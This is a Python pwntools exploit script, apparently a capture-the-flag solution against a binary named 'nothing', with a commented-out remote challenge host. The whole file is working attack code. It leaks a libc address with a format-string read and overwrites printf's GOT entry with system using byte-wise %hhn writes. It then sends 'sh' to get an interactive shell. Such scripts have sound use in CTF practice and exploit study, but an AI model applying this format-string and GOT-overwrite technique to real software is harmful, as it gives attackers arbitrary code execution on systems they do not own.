#!/usr/bin/env python3
from pwn import *

def send_str(payload):
    p.recvuntil(b'> ')
    p.sendline(payload)

p = process('./nothing')
# p = remote('pwn02.chal.ctf.westerns.tokyo', 18247)

raw_input('>')

send_str(b'%10$p')

libc   = int(p.recvline()[:-1], 16) - 0x1b39e7
system = libc + 0x4f4e0
printf_got = 0x601028

log.info('libc: {:#x}'.format(libc))

system_barr = []
system_bset = set()

for i in range(3):
    system_barr.append((system >> i * 8) & 0xff)

payload = ''

# sorting
lb = 0
for _ in range(3):
    nb = 0x100
    ni = 0
    for i, b in enumerate(system_barr):
        if b < nb and b not in system_bset:
            nb = b
            ni = i
    payload += '%{}x%{}$hhn'.format(nb - lb, 14 + ni) 
    system_bset.add(nb)
    lb = nb 

payload = payload.encode().ljust(0x40, b'a')
payload += p64(printf_got)     # %14$p
payload += p64(printf_got + 1) # %15$p
payload += p64(printf_got + 2) # %16$p

send_str(payload)

p.sendline(b'sh')

p.interactive()
